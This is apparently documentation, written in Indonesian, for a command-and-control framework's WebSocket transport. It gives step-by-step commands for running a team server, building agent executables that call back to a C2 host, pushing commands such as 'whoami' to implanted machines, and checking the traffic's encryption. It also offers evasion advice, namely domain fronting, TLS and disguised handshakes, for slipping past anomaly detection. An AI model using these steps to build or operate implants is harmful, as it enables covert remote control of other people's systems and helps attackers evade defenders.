# Transport: WebSocket (WS/WSS)

Agent membuka koneksi WebSocket persistent ke server. Berbeda dengan HTTP/HTTPS yang polling-based, WebSocket memungkinkan server **push command langsung** ke agent tanpa menunggu beacon interval berikutnya — latency command delivery mendekati real-time.

---

## Kapan Dipakai

- **Engagement yang butuh interactive shell feel** — command langsung masuk tanpa nunggu beacon
- Target environment yang allow WebSocket (port 80/443 via Upgrade header)
- Ketika beacon interval panjang (stealth mode) tapi tetap butuh responsivitas saat interact
- Kombinasi dengan `--profile` untuk menyamarkan handshake sebagai legitimate WS traffic

> **OPSEC note**: koneksi persistent lebih mudah dideteksi oleh anomaly detection ("koneksi ke IP eksternal yang tidak pernah putus selama 8 jam"). Mitigasi: pakai `--ws-url wss://` (TLS), pakai domain fronting, set reconnect interval normal.

---

## Arsitektur

```
[Agent] --WS persistent conn--> [Team Server :8081/ws]
          ^                              |
          |                             | push command
          +-------- command +-----------+
               (server-initiated)

[Agent] --HTTP/HTTPS--> [:8080/:8443]  (REST API — masih aktif)
```

Server `--ws` berjalan **paralel** dengan HTTP listener. Agent yang pakai WS transport hanya connect ke WS endpoint; REST API tetap tersedia untuk operator console.

---

## Step 1 — Start Server (WS)

```bash
# WS over plain TCP (lab)
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --ws \
  --ws-port 8081 \
  -port 8080

# WSS (WebSocket over TLS) — gabung dengan --tls
ENCRYPTION_KEY=MySecretKey32Chars00000000000000 \
  go run ./cmd/server \
  --ws \
  --ws-port 8081 \
  --tls \
  --tls-port 8443 \
  -port 8080
```

| Flag | Env | Default | Keterangan |
|------|-----|---------|-----------|
| `--ws` | `$WS_ENABLED` | `false` | Aktifkan WebSocket listener |
| `--ws-port` | `$WS_PORT` | `8081` | Port WS listener |

**Expected log:**
```
  [✓]  WebSocket listener  ·  ws://0.0.0.0:8081/ws
  [✓]  ready  ·  listening on 0.0.0.0:8080
```

---

## Step 2 — Generate Agent (WS)

```bash
# Plain WS (ws://)
go run ./cmd/generate/ stageless \
  --c2 http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  --transport ws \
  --ws-url ws://192.168.1.10:8081/ws \
  --output bin/agent_ws.exe

# WSS (wss://) — TLS WebSocket
go run ./cmd/generate/ stageless \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --transport ws \
  --ws-url wss://c2.example.com:8081/ws \
  --insecure-tls \
  --output bin/agent_wss.exe

# WSS dengan cert pin
go run ./cmd/generate/ stageless \
  --c2 https://c2.example.com \
  --key MySecretKey32Chars00000000000000 \
  --transport ws \
  --ws-url wss://c2.example.com:8081/ws \
  --cert-pin a1b2c3d4e5f6... \
  --output bin/agent_wss_pinned.exe
```

| Flag | Keterangan |
|------|-----------|
| `--transport ws` | Pilih WS transport |
| `--ws-url <url>` | Endpoint WebSocket. Jika dikosongkan, agent derive dari `--c2` URL dengan ganti scheme (`http→ws`, `https→wss`). Tapi explicit lebih aman karena port WS (8081) beda dengan HTTP (8080). |

---

## Step 3 — Verify Checkin

Saat agent connect, server log:
```
[+] WebSocket client connected: <remote-ip>
[+] Agent checkin (WS): <agent-id>  DESKTOP-ABC  user
```

Agent mengirim pesan pertama (type `checkin`) sebelum menerima command apapun. Server respond dengan `noop` atau langsung push command jika ada yang antri.

---

## Step 4 — Verify Push Tasking (beda dari HTTP)

Ini perbedaan utama WS vs HTTP. Test dengan:

```bash
# Di terminal 1: jalankan agent dan pantau
# Di terminal 2: kirim command via operator console SEGERA
go run ./cmd/operator/ \
  --server http://192.168.1.10:8080 \
  --key MySecretKey32Chars00000000000000 \
  exec --agent <agent-id> --cmd "whoami"
```

Command harus **langsung diterima agent** (< 1 detik), bukan nunggu beacon interval berikutnya. Ini konfirmasi push tasking berfungsi.

---

## Step 5 — Verify Koneksi Persistent & Reconnect

1. Jalankan agent
2. Tunggu checkin sukses
3. Restart server (kill + rerun)
4. Pantau agent — harus auto-reconnect dalam ~5 detik dan re-checkin

Log server saat reconnect:
```
[+] WebSocket client connected: <remote-ip>
[+] Agent re-checkin (WS): <agent-id>
```

---

## Step 6 — Verify Encryption via Wireshark

### Plain WS (ws://)

Filter:
```
tcp.port == 8081 && websocket
```

Lihat WebSocket frame (TCP stream) → payload berisi JSON envelope:
```json
{"type":"checkin","id":"<agent-id>","data":"<base64-ciphertext>"}
```

Field `data` harus random base64 (AES-GCM). Jika terlihat JSON plaintext di dalam, sesuatu salah dengan encryption.

### WSS (wss://)

Filter:
```
tcp.port == 8081 && tls
```

Semua frame terenkripsi TLS. Untuk inspect WS frame, butuh TLS key (SSLKEYLOGFILE). Bahkan dengan TLS decrypted, `data` field tetap base64 (double encrypted).

### Inspect WebSocket Upgrade

```
http.upgrade == "websocket"
```

Request header harus berisi:
```
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: <random base64>
```

---

## Wire Format Detail

Semua pesan adalah JSON envelope:

**Agent → Server (checkin):**
```json
{"type": "checkin", "id": "<agent-id>", "data": <encrypted-JSON>}
```

**Server → Agent (noop / push command):**
```json
{"type": "noop",    "id": "", "data": null}
{"type": "command", "id": "<cmd-id>", "data": <encrypted-cmd>}
```

**Agent → Server (result):**
```json
{"type": "result", "id": "<agent-id>", "data": <encrypted-result>}
```

---

## Troubleshooting

| Symptom | Penyebab | Solusi |
|---------|----------|--------|
| Agent tidak connect, server tidak log WS | `--ws` flag lupa di server atau port berbeda | Cek `--ws --ws-port 8081` di server; cek `--ws-url` di agent |
| Agent checkin di HTTP listener, bukan WS | `--transport ws` tidak di-set di agent | Rebuild dengan `--transport ws` |
| `websocket: close 1006` langsung setelah connect | Server reject karena pesan pertama bukan `type=checkin` | Bug di agent transport, cek `pkg/transport/ws.go` |
| Command tidak ter-push (agent dapat command lambat) | Agent pakai HTTP transport, bukan WS | Cek binary: `strings agent.exe \| grep "defaultTransport"` |
| Reconnect loop terus-menerus | Server cert/key salah (WSS) atau `--ws-url` salah | Cek WSS handshake di Wireshark; pastikan `--ws-url` resolve ke server |
| `wsURL` kosong di agent (ws._other.go) | `--ws-url` tidak di-set saat build | Rebuild dengan `--ws-url ws://<ip>:8081/ws` explicit |
